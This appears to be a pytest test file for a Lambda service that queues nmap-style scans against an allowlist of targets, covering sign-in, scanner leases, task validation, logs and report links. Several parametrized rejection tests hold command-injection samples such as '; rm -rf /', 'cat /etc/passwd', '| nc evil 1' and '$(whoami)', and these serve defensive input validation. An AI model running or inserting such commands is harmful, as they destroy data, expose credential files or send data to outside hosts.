"""The Lambda: sign-in, scanners (start with a lease, extend, stop), the task (tool + target + args) checks, the
queue, logs, output links."""
import datetime
import json

import pytest

from conftest import SCANNER_ID, STARTED, FakeCodeBuild, FakeLogs, FakeS3, basic
from lambdakali.server import lambda_function as lf


@pytest.fixture(autouse=True)
def aws(monkeypatch):
    fakes = FakeCodeBuild(), FakeLogs(), FakeS3()
    monkeypatch.setattr(lf, "codebuild", fakes[0])
    monkeypatch.setattr(lf, "logs", fakes[1])
    monkeypatch.setattr(lf, "s3", fakes[2])
    lf._CACHE.clear()
    return fakes


def call(method, path, body=None, auth=True, query=None):
    event = {"requestContext": {"http": {"method": method}}, "rawPath": path,
             "headers": {"authorization": basic()} if auth else {}, "queryStringParameters": query}
    if body is not None:
        event["body"] = json.dumps(body)
    r = lf.lambda_handler(event, None)
    if r["headers"]["content-type"] != "application/json":
        return r["statusCode"], r
    data = json.loads(r["body"])
    data.pop("ms", None)
    return r["statusCode"], data


def add(tool="nmap", target="scanme.example.com", args="-sV {target}"):
    return call("POST", "/api/tasks", {"tool": tool, "target": target, "args": args})


def queued(aws):
    return [json.loads(v) for k, v in sorted(aws[2].objects.items()) if k.startswith("tasks/")]


def test_page_is_public_and_carries_the_version():
    status, r = call("GET", "/", auth=False)
    assert status == 200 and lf.VERSION in r["body"] and "lambdakali" in r["body"]


def test_api_needs_sign_in():
    assert call("GET", "/api/scanners", auth=False)[0] == 401


def test_config_lists_tools_and_targets():
    status, r = call("GET", "/api/config")
    assert status == 200 and "nmap" in r["tools"] and r["allowed_targets"][0] == "example.com"
    assert r["durations"] == [60, 120, 240, 480] and r["max_scanners"] == 2 and "BUILD_GENERAL1_LARGE" in r["instances"]


def test_start_with_instance_and_lease(aws):
    status, r = call("POST", "/api/scanners", {"compute_type": "BUILD_GENERAL1_MEDIUM", "minutes": 60})
    assert status == 201 and r["id"] == SCANNER_ID and r["compute_type"] == "BUILD_GENERAL1_MEDIUM" and r["until"]
    assert aws[0].started[0]["compute_type"] == "BUILD_GENERAL1_MEDIUM"


def test_at_most_max_scanners(aws):
    assert call("POST", "/api/scanners", {})[0] == 201 and call("POST", "/api/scanners", {})[0] == 201
    status, r = call("POST", "/api/scanners", {})
    assert status == 409 and "max_scanners" in r["error"]


def test_extend_up_to_the_limit(aws):
    call("POST", "/api/scanners", {"minutes": 60})
    assert call("POST", f"/api/scanners/{SCANNER_ID}/extend")[0] == 200
    for _ in range(10):
        status, r = call("POST", f"/api/scanners/{SCANNER_ID}/extend")
    assert status == 400 and "max_session_minutes" in r["error"]
    limit = (STARTED + datetime.timedelta(minutes=480)).strftime("%Y-%m-%dT%H:%M:%SZ")
    assert json.loads(aws[2].objects[f"leases/{SCANNER_ID}.json"])["until"] == limit


@pytest.mark.parametrize("target", ["scanme.example.com", "example.com", "app.example.org:8443",
                                    "https://a.b.example.net/login", "http://example.com:8080"])
def test_allowed_targets_are_added(target, aws):
    status, r = add(target=target)
    assert status == 201 and r["tool"] == "nmap" and r["target"] == target and r["args"] == "-sV {target}" and r["claim"] is None
    assert [t["id"] for t in queued(aws)] == [r["id"]]


@pytest.mark.parametrize("target", ["evil.com", "example.com.evil.com", "example.net", "app.example.org",
                                    "app.example.org:9443", "https://evil.com/"])
def test_other_hosts_are_forbidden(target, aws):
    status, r = add(target=target)
    assert status == 403 and "allowlist" in r["error"] and not queued(aws)


def test_unknown_tool_is_rejected(aws):
    status, r = add(tool="rm")
    assert status == 400 and "tool" in r["error"] and not queued(aws)


@pytest.mark.parametrize("args", ["-sV", "", "-p 80 example.com", "-sV {target}; rm -rf /", "{target} && cat /etc/passwd",
                                  "{target} | nc evil 1", "-oN $(whoami) {target}", "{target} `id`", "{target} > /tmp/x"])
def test_bad_args_are_rejected(args, aws):
    status, r = add(args=args)
    assert status == 400 and not queued(aws)


@pytest.mark.parametrize("target", ["", "a b", "scanme.example.com; rm", "ftp://example.com/", "scanme.example.com | nc"])
def test_bad_targets_are_rejected(target, aws):
    assert add(target=target)[0] in (400, 403) and not queued(aws)


def test_tasks_sort_in_order_and_list_newest_first(aws):
    ids = [add(target=f"h{i}.example.com")[1]["id"] for i in range(3)]
    assert ids == sorted(ids)
    status, r = call("GET", "/api/tasks")
    assert [t["id"] for t in r["tasks"]] == ids[::-1]


def test_task_with_claim_log_and_output(aws):
    call("POST", "/api/scanners", {})
    t = add()[1]
    aws[2].objects[f"claims/{t['id']}.json"] = json.dumps({"scanner": SCANNER_ID, "started": "2026-11-21T10:01:00Z"}).encode()
    aws[1].streams[SCANNER_ID] = ["::ready", f"::task {t['id']} start", f"::run {t['id']} nmap -sV scanme.example.com",
                                  f"::out {t['id']} PORT 80/tcp open", "noise from another task"]
    status, r = call("GET", f"/api/tasks/{t['id']}")
    assert status == 200 and r["claim"]["scanner"] == SCANNER_ID
    assert [e["line"] for e in r["log"]] == aws[1].streams[SCANNER_ID][1:4]
    aws[2].objects[f"reports/{t['id']}/output.txt"] = b"PORT 80/tcp open"
    status, r = call("GET", f"/api/tasks/{t['id']}")
    assert r["reports"] == {"output.txt": f"https://signed/reports/{t['id']}/output.txt?expires=3600"}


def test_cancel_only_before_taken(aws):
    t = add()[1]
    assert call("POST", f"/api/tasks/{t['id']}/cancel")[0] == 200
    assert call("POST", f"/api/tasks/{t['id']}/cancel")[0] == 409


def test_ids_are_checked():
    assert call("GET", "/api/scanners/not-a-uuid/log")[0] == 400
    assert call("GET", "/api/tasks/..%2Fother")[0] in (400, 404)
    assert call("GET", f"/api/scanners/{SCANNER_ID}/log")[0] == 404
